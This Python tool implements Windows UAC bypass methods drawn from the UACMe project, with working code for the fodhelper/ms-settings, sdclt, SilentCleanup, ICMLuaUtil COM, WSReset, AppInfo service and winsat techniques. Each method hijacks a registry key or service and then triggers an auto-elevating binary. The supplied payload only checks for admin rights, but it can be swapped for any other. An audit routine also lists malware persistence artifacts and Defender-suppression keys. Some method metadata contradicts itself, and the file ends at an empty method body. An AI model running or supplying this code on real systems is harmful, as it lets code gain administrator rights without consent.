# uac_bypass_tester_extended.py
"""
UAC Bypass Method Tester - Extended Edition
===========================================
This tool tests comprehensive UAC bypass methods inspired by the UACMe project.

Based on: https://github.com/hfiref0x/UACME
Author: Security Research Tool
Version: 2.0
"""

import os
import sys
import time
import json
import subprocess
import tempfile
import shutil
from datetime import datetime
import platform
import ctypes

# Windows-specific imports
WINDOWS_AVAILABLE = False
try:
    if platform.system() == 'Windows':
        WINDOWS_AVAILABLE = True
        import winreg
        import win32api
        import win32con
        import win32security
        import win32process
        import win32event
        import pythoncom
        import win32com.client
except ImportError as e:
    print(f"Windows modules import warning: {e}")
    print("Some tests may be skipped.")

# ============================================================================
# UACME METHODS DATABASE
# ============================================================================

UACME_METHODS = {
    1: {
        'name': 'Leo Davidson (Method 1)',
        'type': 'DLL Hijack',
        'target': 'sysprep.exe',
        'component': 'cryptbase.dll',
        'works_from': 'Windows 7 (7600)',
        'fixed_in': 'Windows 8.1 (9600)',
        'status': 'removed'
    },
    2: {
        'name': 'Leo Davidson derivative (Method 2)',
        'type': 'DLL Hijack',
        'target': 'sysprep.exe',
        'component': 'ShCore.dll',
        'works_from': 'Windows 8.1 (9600)',
        'fixed_in': 'Windows 10 TP (> 9600)',
        'status': 'removed'
    },
    3: {
        'name': 'Leo Davidson derivative by WinNT/Pitou (Method 3)',
        'type': 'DLL Hijack',
        'target': 'setupsqm.exe',
        'component': 'WdsCore.dll',
        'works_from': 'Windows 7 (7600)',
        'fixed_in': 'Windows 10 TH2 (10558)',
        'status': 'removed'
    },
    4: {
        'name': 'Jon Ericson, WinNT/Gootkit, mzH (Method 4)',
        'type': 'AppCompat',
        'target': 'cliconfg.exe',
        'component': 'RedirectEXE Shim',
        'works_from': 'Windows 7 (7600)',
        'fixed_in': 'Windows 10 TP (> 9600)',
        'status': 'removed'
    },
    5: {
        'name': 'WinNT/Simda (Method 5)',
        'type': 'Elevated COM interface',
        'target': 'HKLM registry keys',
        'component': 'ISecurityEditor',
        'works_from': 'Windows 7 (7600)',
        'fixed_in': 'Windows 10 TH1 (10147)',
        'status': 'removed'
    },
    6: {
        'name': 'Win32/Carberp (Method 6)',
        'type': 'DLL Hijack',
        'target': 'mcx2prov.exe, migwiz.exe',
        'component': 'WdsCore.dll, CryptBase.dll, CryptSP.dll',
        'works_from': 'Windows 7 (7600)',
        'fixed_in': 'Windows 10 TH1 (10147)',
        'status': 'removed'
    },
    22: {
        'name': 'Leo Davidson derivative (Method 22)',
        'type': 'DLL Hijack with SxS DotLocal',
        'target': 'consent.exe',
        'component': 'comctl32.dll',
        'works_from': 'Windows 7 (7600)',
        'fixed_in': 'unfixed',
        'status': 'current'
    },
    23: {
        'name': 'Leo Davidson derivative (Method 23)',
        'type': 'DLL Hijack',
        'target': 'pkgmgr.exe',
        'component': 'DismCore.dll',
        'works_from': 'Windows 7 (7600)',
        'fixed_in': 'unfixed',
        'status': 'current'
    },
    25: {
        'name': 'Enigma0x3 (Method 25) - Event Viewer',
        'type': 'Shell API',
        'target': 'eventvwr.exe',
        'component': 'Registry hijack',
        'works_from': 'Windows 7 (7600)',
        'fixed_in': 'Partially mitigated',
        'status': 'disabled'
    },
    31: {
        'name': 'sdclt.exe Bypass (Method 31)',
        'type': 'Shell API',
        'target': 'sdclt.exe',
        'component': 'Registry hijack',
        'works_from': 'Windows 10',
        'fixed_in': 'Windows 10 RS3',
        'status': 'current'
    },
    33: {
        'name': 'Fodhelper/ComputerDefaults (Method 33)',
        'type': 'Protocol Handler',
        'target': 'fodhelper.exe, computerdefaults.exe',
        'component': 'ms-settings protocol',
        'works_from': 'Windows 10',
        'fixed_in': 'Windows 11',
        'status': 'current'
    },
    34: {
        'name': 'SilentCleanup (Method 34)',
        'type': 'Scheduled Task',
        'target': 'SilentCleanup task',
        'component': 'Environment variable',
        'works_from': 'Windows 7',
        'fixed_in': 'Windows 10',
        'status': 'current'
    },
    41: {
        'name': 'ICMLuaUtil COM (Method 41)',
        'type': 'COM Interface',
        'target': 'ICMLuaUtil',
        'component': 'COM object elevation',
        'works_from': 'Windows Vista',
        'fixed_in': 'Windows 10 1809',
        'status': 'current'
    },
    56: {
        'name': 'WSReset.exe (Method 56)',
        'type': 'Shell API',
        'target': 'WSReset.exe',
        'component': 'AppX registry hijack',
        'works_from': 'Windows 10',
        'fixed_in': 'Windows 10 1903',
        'status': 'current'
    },
    61: {
        'name': 'AppInfo Service (Method 61)',
        'type': 'Service Manipulation',
        'target': 'AppInfo service',
        'component': 'Service configuration',
        'works_from': 'Windows 7',
        'fixed_in': 'Windows 10',
        'status': 'current'
    },
    67: {
        'name': 'winsat.exe (Method 67)',
        'type': 'Shell API',
        'target': 'winsat.exe',
        'component': 'Registry hijack',
        'works_from': 'Windows Vista',
        'fixed_in': 'Windows 10',
        'status': 'current'
    }
}

# ============================================================================
# UAC BYPASS TESTER - EXTENDED
# ============================================================================

class UACBypassTestResult:
    """Result of a UAC bypass test"""
    def __init__(self, method_id, method_name, success, details, error=None):
        self.method_id = method_id
        self.method_name = method_name
        self.success = success
        self.details = details
        self.error = error
        self.timestamp = datetime.now()
    
    def to_dict(self):
        return {
            'method_id': self.method_id,
            'method_name': self.method_name,
            'success': self.success,
            'details': self.details,
            'error': self.error,
            'timestamp': self.timestamp.isoformat()
        }
    
    def __str__(self):
        status = "✅ SUCCESS" if self.success else "❌ FAILED"
        return f"[{status}] Method {self.method_id}: {self.method_name}"

class ExtendedUACTester:
    """Extended UAC bypass tester with UACMe methods"""
    
    def __init__(self, verbose=True):
        self.verbose = verbose
        self.results = []
        self.successful_methods = []
        self.failed_methods = []
        self.original_values = {}
        self.cleanup_files = []
        self.temp_files = []
        
        # System info
        self.system_info = self._get_system_info()
        self.test_payload = self._create_test_payload()
        
    def _get_system_info(self):
        """Get detailed system information"""
        info = {
            'system': platform.system(),
            'release': platform.release(),
            'version': platform.version(),
            'architecture': platform.architecture()[0],
            'machine': platform.machine(),
            'processor': platform.processor(),
            'python_version': platform.python_version(),
            'is_admin': self._is_admin(),
            'windows_build': self._get_windows_build(),
            'timestamp': datetime.now().isoformat()
        }
        return info
    
    def _is_admin(self):
        """Check admin privileges"""
        if not WINDOWS_AVAILABLE:
            return False
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    def _get_windows_build(self):
        """Get Windows build number"""
        if WINDOWS_AVAILABLE:
            try:
                import win32api
                return win32api.GetVersionEx()[2]
            except:
                pass
        return 0
    
    def _create_test_payload(self):
        """Create test payload to verify elevation"""
        payload_script = '''
import sys
import os
import ctypes
import json
import tempfile

def check_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Create verification file
result = {
    'admin': check_admin(),
    'pid': os.getpid(),
    'parent_pid': os.getppid() if hasattr(os, 'getppid') else 0,
    'username': os.environ.get('USERNAME', ''),
    'computername': os.environ.get('COMPUTERNAME', ''),
    'system_root': os.environ.get('SystemRoot', ''),
    'process_name': os.path.basename(sys.executable) if hasattr(sys, 'executable') else 'unknown',
    'timestamp': __import__('datetime').datetime.now().isoformat()
}

# Write to temp file
temp_dir = tempfile.gettempdir()
result_file = os.path.join(temp_dir, 'uacme_test_result.json')
with open(result_file, 'w') as f:
    json.dump(result, f)

# Keep process alive briefly
import time
time.sleep(3)
'''
        
        # Save to temp file
        temp_dir = tempfile.gettempdir()
        script_path = os.path.join(temp_dir, f'uacme_payload_{int(time.time())}.py')
        
        with open(script_path, 'w') as f:
            f.write(payload_script)
        
        self.cleanup_files.append(script_path)
        return f'python.exe "{script_path}"'
    
    def _check_elevation(self):
        """Check if elevation occurred"""
        result_file = os.path.join(tempfile.gettempdir(), 'uacme_test_result.json')
        
        try:
            if os.path.exists(result_file):
                with open(result_file, 'r') as f:
                    result = json.load(f)
                os.remove(result_file)
                return result.get('admin', False), result
        except:
            pass
        
        return False, None
    
    def _cleanup(self):
        """Clean up temporary files and registry"""
        # Clean registry
        for key_info in self.original_values.values():
            try:
                key_path, value_name, original_value = key_info
                if original_value is None:
                    try:
                        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                    except:
                        pass
                else:
                    try:
                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, original_value)
                        winreg.CloseKey(key)
                    except:
                        pass
            except:
                pass
        
        # Clean files
        for file_path in self.cleanup_files + self.temp_files:
            try:
                if os.path.exists(file_path):
                    os.remove(file_path)
            except:
                pass
        
        self.original_values.clear()
        self.cleanup_files.clear()
        self.temp_files.clear()
    
    def _save_registry_backup(self, key_path, value_name=""):
        """Backup registry value"""
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
            original_value, _ = winreg.QueryValueEx(key, value_name)
            winreg.CloseKey(key)
            self.original_values[(key_path, value_name)] = (key_path, value_name, original_value)
        except:
            self.original_values[(key_path, value_name)] = (key_path, value_name, None)
    
    def _run_process(self, cmd, timeout=15):
        """Run process with timeout"""
        try:
            import shlex
            if isinstance(cmd, str):
                if os.name == 'nt':
                    args = ['cmd.exe', '/C', cmd]
                else:
                    args = shlex.split(cmd)
            else:
                args = cmd
            process = subprocess.Popen(args, creationflags=subprocess.CREATE_NO_WINDOW, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            try:
                stdout, stderr = process.communicate(timeout=timeout)
                return process.returncode == 0
            except subprocess.TimeoutExpired:
                process.kill()
                process.communicate()
                return True  # Process started
            
        except Exception as e:
            if self.verbose:
                print(f"  Process error: {e}")
            return False
    
    # ============================================================================
    # UACME METHOD IMPLEMENTATIONS
    # ============================================================================
    
    def test_method_25(self):
        return False
    
    def test_method_31(self):
        """Method 31: sdclt.exe bypass"""
        if not WINDOWS_AVAILABLE:
            return False
        
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
            self._save_registry_backup(key_path, "")
            
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.test_payload)
            winreg.CloseKey(key)
            
            sdclt_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'sdclt.exe')
            return self._run_process(f'"{sdclt_path}"')
            
        except Exception as e:
            if self.verbose:
                print(f"  Method 31 error: {e}")
            return False
    
    def test_method_33(self):
        """Method 33: Fodhelper/ComputerDefaults protocol"""
        if not WINDOWS_AVAILABLE:
            return False
        
        try:
            # ms-settings protocol hijack
            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
            self._save_registry_backup(key_path, "")
            
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.test_payload)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            # Try fodhelper first
            fodhelper_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'fodhelper.exe')
            if self._run_process(f'"{fodhelper_path}"'):
                return True
            
            # Try computerdefaults
            computerdefaults_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'ComputerDefaults.exe')
            return self._run_process(f'"{computerdefaults_path}"')
            
        except Exception as e:
            if self.verbose:
                print(f"  Method 33 error: {e}")
            return False
    
    def test_method_34(self):
        """Method 34: SilentCleanup scheduled task"""
        if not WINDOWS_AVAILABLE:
            return False
        
        try:
            # Set environment variable
            key_path = r"Environment"
            self._save_registry_backup(key_path, "windir")
            
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "windir", 0, winreg.REG_EXPAND_SZ, f'{self.test_payload} & ')
            winreg.CloseKey(key)
            
            # Run SilentCleanup task
            result = subprocess.run(
                ["schtasks", "/run", "/tn", r"\Microsoft\Windows\DiskCleanup\SilentCleanup"],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return result.returncode == 0
            
        except Exception as e:
            if self.verbose:
                print(f"  Method 34 error: {e}")
            return False
    
    def test_method_41(self):
        """Method 41: ICMLuaUtil COM interface"""
        if not WINDOWS_AVAILABLE:
            return False
        
        try:
            pythoncom.CoInitialize()
            
            # Create elevated COM object
            lua_util = win32com.client.Dispatch(
                "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
            )
            
            # Execute payload
            lua_util.ShellExec(self.test_payload, "", "", 0, 1)
            return True
            
        except Exception as e:
            if self.verbose:
                print(f"  Method 41 error: {e}")
            return False
        finally:
            try:
                pythoncom.CoUninitialize()
            except:
                pass
    
    def test_method_56(self):
        """Method 56: WSReset.exe bypass"""
        if not WINDOWS_AVAILABLE:
            return False
        
        try:
            key_path = r"Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
            self._save_registry_backup(key_path, "")
            
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.test_payload)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            wsreset_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WSReset.exe')
            return self._run_process(f'"{wsreset_path}"')
            
        except Exception as e:
            if self.verbose:
                print(f"  Method 56 error: {e}")
            return False
    
    def test_method_61(self):
        """Method 61: AppInfo service manipulation"""
        if not WINDOWS_AVAILABLE:
            return False
        
        try:
            # Create VBS script for silent execution
            vbs_script = f'''
Set objShell = CreateObject("WScript.Shell")
objShell.Run "{self.test_payload}", 0, False
Set objShell = Nothing
'''
            
            vbs_path = os.path.join(tempfile.gettempdir(), "appinfo_helper.vbs")
            with open(vbs_path, 'w') as f:
                f.write(vbs_script)
            
            self.temp_files.append(vbs_path)
            
            # Try to manipulate AppInfo service
            # Note: This may require admin privileges to modify services
            try:
                # Stop service temporarily
                subprocess.run(['sc.exe', 'stop', 'Appinfo'], 
                             creationflags=subprocess.CREATE_NO_WINDOW, 
                             timeout=10, 
                             capture_output=True)
                
                # Modify service binary path
                subprocess.run(['sc.exe', 'config', 'Appinfo', 'binPath=', 
                              f'wscript.exe //B //Nologo "{vbs_path}" && svchost.exe -k netsvcs -p'], 
                             creationflags=subprocess.CREATE_NO_WINDOW, 
                             timeout=10, 
                             capture_output=True)
                
                # Start service
                subprocess.run(['sc.exe', 'start', 'Appinfo'], 
                             creationflags=subprocess.CREATE_NO_WINDOW, 
                             timeout=10, 
                             capture_output=True)
                
                # Restore original configuration
                subprocess.run(['sc.exe', 'config', 'Appinfo', 'binPath=', 
                              r'%SystemRoot%\system32\svchost.exe -k netsvcs -p'], 
                             creationflags=subprocess.CREATE_NO_WINDOW, 
                             timeout=10, 
                             capture_output=True)
                
                return True
                
            except:
                return False
                
        except Exception as e:
            if self.verbose:
                print(f"  Method 61 error: {e}")
            return False
    
    def test_method_67(self):
        """Method 67: winsat.exe bypass"""
        if not WINDOWS_AVAILABLE:
            return False
        
        try:
            key_path = r"Software\Classes\Folder\shell\open\command"
            self._save_registry_backup(key_path, "")
            
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.test_payload)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            winsat_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'winsat.exe')
            return self._run_process(f'"{winsat_path}" disk')
            
        except Exception as e:
            if self.verbose:
                print(f"  Method 67 error: {e}")
            return False
    
    # ============================================================================
    # TEST RUNNER
    # ============================================================================
    
    def run_test(self, method_id, test_func):
        """Run a single UAC bypass test"""
        method_info = UACME_METHODS.get(method_id, {})
        method_name = method_info.get('name', f'Method {method_id}')
        
        print(f"\n{'='*80}")
        print(f"Testing: {method_name}")
        print(f"Type: {method_info.get('type', 'Unknown')}")
        print(f"Target: {method_info.get('target', 'Unknown')}")
        print(f"Works from: {method_info.get('works_from', 'Unknown')}")
        print(f"Status: {method_info.get('status', 'Unknown')}")
        print(f"{'='*80}")
        
        # Skip if already admin
        if self._is_admin():
            result = UACBypassTestResult(
                method_id, method_name, True,
                "Already running as administrator",
                None
            )
            self.results.append(result)
            self.successful_methods.append(result)
            print("✅ Already running as admin - test skipped")
            return result
        
        # Clean previous test results
        result_file = os.path.join(tempfile.gettempdir(), 'uacme_test_result.json')
        if os.path.exists(result_file):
            try:
                os.remove(result_file)
            except:
                pass
        
        try:
            # Run the test
            start_time = time.time()
            success = test_func()
            elapsed = time.time() - start_time
            
            # Check for elevation
            time.sleep(3)
            elevated, details = self._check_elevation()
            
            # Cleanup
            self._cleanup()
            
            if success and elevated:
                result = UACBypassTestResult(
                    method_id, method_name, True,
                    f"Elevation successful ({elapsed:.2f}s)",
                    None
                )
                self.successful_methods.append(result)
                print(f"✅ SUCCESS: Method {method_id} worked!")
            elif success:
                result = UACBypassTestResult(
                    method_id, method_name, False,
                    f"Method executed but no elevation ({elapsed:.2f}s)",
                    "Admin privileges not obtained"
                )
                self.failed_methods.append(result)
                print(f"⚠️ PARTIAL: Method executed but no elevation")
            else:
                result = UACBypassTestResult(
                    method_id, method_name, False,
                    f"Method execution failed ({elapsed:.2f}s)",
                    "Method returned False"
                )
                self.failed_methods.append(result)
                print(f"❌ FAILED: Method did not work")
            
            self.results.append(result)
            return result
            
        except Exception as e:
            self._cleanup()
            
            result = UACBypassTestResult(
                method_id, method_name, False,
                "Method execution error",
                str(e)
            )
            self.results.append(result)
            self.failed_methods.append(result)
            print(f"❌ ERROR: {e}")
            return result
    
    def run_all_tests(self, method_ids=None):
        """Run all specified UAC bypass tests"""
        print("="*80)
        print("UACME BYPASS TESTER - EXTENDED EDITION")
        print("="*80)
        print(f"System: {self.system_info['system']} {self.system_info['release']}")
        print(f"Build: {self.system_info['windows_build']}")
        print(f"Architecture: {self.system_info['architecture']}")
        print(f"Admin: {'Yes' if self.system_info['is_admin'] else 'No'}")
        print("="*80)
        
        # Define test methods
        test_methods = {
            31: self.test_method_31,
            33: self.test_method_33,
            34: self.test_method_34,
            41: self.test_method_41,
            56: self.test_method_56,
            61: self.test_method_61,
            67: self.test_method_67,
        }
        
        # Filter by requested method IDs
        if method_ids:
            test_methods = {k: v for k, v in test_methods.items() if k in method_ids}
        
        # Run tests
        for method_id, test_func in test_methods.items():
            if method_id in UACME_METHODS:
                self.run_test(method_id, test_func)
        
        # Generate report
        return self.generate_report()
    
    def generate_report(self):
        """Generate comprehensive test report"""
        print("\n" + "="*80)
        print("TEST SUMMARY")
        print("="*80)
        
        total_tests = len(self.results)
        successful = len(self.successful_methods)
        failed = len(self.failed_methods)
        
        print(f"Total Tests: {total_tests}")
        print(f"Successful: {successful}")
        print(f"Failed: {failed}")
        
        if total_tests > 0:
            success_rate = (successful / total_tests) * 100
            print(f"Success Rate: {success_rate:.1f}%")
        else:
            print("Success Rate: 0.0%")
        
        # Successful methods
        if successful > 0:
            print("\n✅ SUCCESSFUL METHODS:")
            for result in self.successful_methods:
                method_info = UACME_METHODS.get(result.method_id, {})
                print(f"  Method {result.method_id}: {result.method_name}")
                print(f"    Type: {method_info.get('type', 'Unknown')}")
                print(f"    Target: {method_info.get('target', 'Unknown')}")
        
        # Failed methods
        if failed > 0:
            print("\n❌ FAILED METHODS:")
            for result in self.failed_methods:
                print(f"  Method {result.method_id}: {result.method_name}")
                if result.error:
                    error_msg = result.error[:100] + "..." if len(result.error) > 100 else result.error
                    print(f"    Error: {error_msg}")
        
        # Save detailed report
        report_data = {
            'system_info': self.system_info,
            'summary': {
                'total_tests': total_tests,
                'successful': successful,
                'failed': failed,
                'success_rate': success_rate if total_tests > 0 else 0
            },
            'results': [result.to_dict() for result in self.results],
            'uacme_methods': UACME_METHODS
        }
        
        # Save JSON report
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        json_file = f"uacme_test_report_{timestamp}.json"
        
        with open(json_file, 'w') as f:
            json.dump(report_data, f, indent=2)
        
        # Generate HTML report
        html_file = f"uacme_test_report_{timestamp}.html"
        self._generate_html_report(report_data, html_file)
        
        print(f"\n📊 Reports saved:")
        print(f"  - JSON: {json_file}")
        print(f"  - HTML: {html_file}")
        
        return report_data

    def _reg_exists(self, root, subkey):
        try:
            key = winreg.OpenKey(root, subkey, 0, winreg.KEY_READ)
            winreg.CloseKey(key)
            return True
        except:
            return False

    def _reg_value(self, root, subkey, name):
        try:
            key = winreg.OpenKey(root, subkey, 0, winreg.KEY_READ)
            v, _ = winreg.QueryValueEx(key, name)
            winreg.CloseKey(key)
            return v
        except:
            return None

    def _task_exists(self, name):
        try:
            r = subprocess.run(["schtasks", "/query", "/tn", name], capture_output=True, text=True)
            return r.returncode == 0
        except:
            return False

    def _service_exists(self, name):
        try:
            r = subprocess.run(["sc", "query", name], capture_output=True, text=True)
            return r.returncode == 0 and ("SERVICE_NAME" in r.stdout or "STATE" in r.stdout)
        except:
            return False

    def audit_all(self, client_path=None):
        data = {}
        uac_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        data["uac_policy"] = {
            "EnableLUA": self._reg_value(winreg.HKEY_LOCAL_MACHINE, uac_key, "EnableLUA"),
            "ConsentPromptBehaviorAdmin": self._reg_value(winreg.HKEY_LOCAL_MACHINE, uac_key, "ConsentPromptBehaviorAdmin"),
            "PromptOnSecureDesktop": self._reg_value(winreg.HKEY_LOCAL_MACHINE, uac_key, "PromptOnSecureDesktop")
        }
        data["notifications"] = {
            "ToastEnabled": self._reg_value(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications", "ToastEnabled"),
            "DisableNotificationCenter_HKCU": self._reg_value(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Policies\Microsoft\Windows\Explorer", "DisableNotificationCenter"),
            "DisableNotificationCenter_HKLM": self._reg_value(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\Explorer", "DisableNotificationCenter"),
            "DefenderSecurityCenter_DisableNotifications": self._reg_value(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications", "DisableNotifications"),
            "DefenderSecurityCenter_HideSystray": self._reg_value(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray", "HideSystray"),
            "UX_Notification_Suppress": self._reg_value(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows Defender\UX Configuration", "Notification_Suppress")
        }
        data["uac_bypass_keys"] = {
            "ms_settings": self._reg_exists(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\Shell\Open\command"),
            "mscfile": self._reg_exists(winreg.HKEY_CURRENT_USER, r"Software\Classes\mscfile\shell\open\command"),
            "exefile": self._reg_exists(winreg.HKEY_CURRENT_USER, r"Software\Classes\exefile\shell\open\command"),
            "folder_shell": self._reg_exists(winreg.HKEY_CURRENT_USER, r"Software\Classes\Folder\shell\open\command"),
            "appx_wsreset": self._reg_exists(winreg.HKEY_CURRENT_USER, r"Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command")
        }
        data["ifeo_svchost"] = {
            "HKLM": self._reg_exists(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe"),
            "WOW6432": self._reg_exists(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe")
        }
        data["com_hijacks"] = {
            "ICMLuaUtil": self._reg_exists(winreg.HKEY_CURRENT_USER, r"Software\Classes\CLSID\{3E5FC7F9-9A51-4367-9063-A120244FBEC7}\InprocServer32"),
            "IColorDataProxy": self._reg_exists(winreg.HKEY_CURRENT_USER, r"Software\Classes\CLSID\{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}\InprocServer32"),
            "BCDE0395": self._reg_exists(winreg.HKEY_CURRENT_USER, r"Software\Classes\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}\InprocServer32")
        }
        data["env_windir"] = {
            "HKCU_Environment": self._reg_value(winreg.HKEY_CURRENT_USER, r"Environment", "windir"),
            "HKCU_Volatile": self._reg_value(winreg.HKEY_CURRENT_USER, r"Volatile Environment", "windir")
        }
        tasks = ["WindowsSecurityUpdate", "WindowsSecurityUpdateTask", "MicrosoftEdgeUpdateTaskUser", "SystemUpdateTask", r"\Microsoft\Windows\DiskCleanup\SilentCleanup"]
        data["scheduled_tasks"] = {t: self._task_exists(t) for t in tasks}
        services = ["WindowsSecurityService", "WindowsSecurityUpdate", "SystemUpdateService"]
        data["services"] = {s: self._service_exists(s) for s in services}
        data["startup_run"] = {
            "HKCU_Run_svchost32": self._reg_value(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "svchost32"),
            "HKCU_RunOnce_svchost32": self._reg_value(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "svchost32"),
            "HKCU_Run_WindowsSecurityUpdate": self._reg_value(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsSecurityUpdate"),
            "HKCU_RunOnce_WindowsSecurityUpdate": self._reg_value(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "WindowsSecurityUpdate")
        }
        suspicious_files = [
            os.path.join(os.environ.get('LOCALAPPDATA', ''), "Microsoft", "Windows", "svchost32.exe"),
            os.path.join(os.environ.get('LOCALAPPDATA', ''), "Microsoft", "Windows", "svchost32.bat"),
            os.path.join(os.environ.get('LOCALAPPDATA', ''), "Microsoft", "Windows", "svchost32.py"),
            os.path.join(os.environ.get('APPDATA', ''), "Microsoft", "Windows", "svchost32.exe"),
            os.path.join(os.environ.get('APPDATA', ''), "Microsoft", "Windows", "svchost32.bat"),
            os.path.join(os.environ.get('APPDATA', ''), "Microsoft", "Windows", "svchost32.py"),
            os.path.join(tempfile.gettempdir(), "svchost32.py"),
            os.path.join(tempfile.gettempdir(), "svchost32.bat"),
            os.path.join(tempfile.gettempdir(), "svchost32.exe"),
            os.path.join(tempfile.gettempdir(), "watchdog.py"),
            os.path.join(tempfile.gettempdir(), "watchdog.bat"),
            os.path.join(tempfile.gettempdir(), "deploy.ps1"),
            os.path.join(tempfile.gettempdir(), "tamper_protection.py"),
            os.path.join(tempfile.gettempdir(), "tamper_protection.exe"),
            os.path.join(tempfile.gettempdir(), "uac_bypass.reg"),
            os.path.join(tempfile.gettempdir(), "Windows"),
            os.path.join(tempfile.gettempdir(), "System32"),
            os.path.join(tempfile.gettempdir(), "junction_target"),
            os.path.join(tempfile.gettempdir(), "fake_system32"),
            os.path.join(tempfile.gettempdir(), "profiler.dll"),
            os.path.join(tempfile.gettempdir(), "DismCore.dll"),
            os.path.join(tempfile.gettempdir(), "wow64log.dll"),
            os.path.join(tempfile.gettempdir(), "mock_system32"),
            os.path.join(tempfile.gettempdir(), "fake.msc"),
            r"C:\Windows\System32\svchost32.exe",
            r"C:\Windows\SysWOW64\svchost32.exe",
            r"C:\Windows\System32\drivers\svchost32.exe"
        ]
        data["files"] = {p: os.path.exists(p) for p in suspicious_files}
        patterns = [
            r"Software\\Classes\\ms-settings\\Shell\\Open\\command",
            r"Software\\Classes\\mscfile\\shell\\open\\command",
            r"Software\\Classes\\exefile\\shell\\open\\command",
            r"Software\\Classes\\Folder\\shell\\open\\command",
            r"Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command",
            r"DiskCleanup\\SilentCleanup",
            r"Image File Execution Options",
            r"ICMLuaUtil",
            r"EnableLUA",
            r"ConsentPromptBehaviorAdmin",
            r"PromptOnSecureDesktop",
            r"DisableNotificationCenter",
            r"PushNotifications",
            r"Windows Defender",
            r"COR_ENABLE_PROFILING",
            r"COR_PROFILER",
            r"windir",
            r"svchost32"
        ]
        client_source = client_path or os.path.join(os.getcwd(), "client.py")
        source_found = {}
        try:
            if os.path.exists(client_source):
                txt = ""
                with open(client_source, "r", encoding="utf-8", errors="ignore") as f:
                    txt = f.read()
                for pat in patterns:
                    source_found[pat] = (pat in txt)
        except:
            pass
        data["source_scan"] = source_found
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_json = f"uac_audit_report_{ts}.json"
        try:
            with open(out_json, "w") as f:
                json.dump(data, f, indent=2)
        except:
            pass
        print("="*80)
        print("AUDIT SUMMARY")
        print("="*80)
        print(f"UAC Policy: EnableLUA={data['uac_policy']['EnableLUA']} ConsentPromptBehaviorAdmin={data['uac_policy']['ConsentPromptBehaviorAdmin']} PromptOnSecureDesktop={data['uac_policy']['PromptOnSecureDesktop']}")
        c = sum(1 for k,v in data["uac_bypass_keys"].items() if v)
        print(f"UAC Bypass Keys Found: {c}")
        c2 = sum(1 for k,v in data["files"].items() if v)
        print(f"Suspicious Files Found: {c2}")
        print(f"Scheduled Tasks: {data['scheduled_tasks']}")
        print(f"Services: {data['services']}")
        print(f"Notifications: {data['notifications']}")
        print(f"Startup Run: {data['startup_run']}")
        print(f"IFEO svchost: {data['ifeo_svchost']}")
        print(f"COM Hijacks: {data['com_hijacks']}")
        print(f"Env windir: {data['env_windir']}")
        print(f"Source Patterns Found: {sum(1 for v in source_found.values() if v)}")
        print(f"Report saved: {out_json}")
        return data

    def run_audit(self):
        return self.audit_all(r"c:\Users\vboxuser_sphinx\testing\testing\client.py")

    def _generate_html_report(self, report_data, output_file):
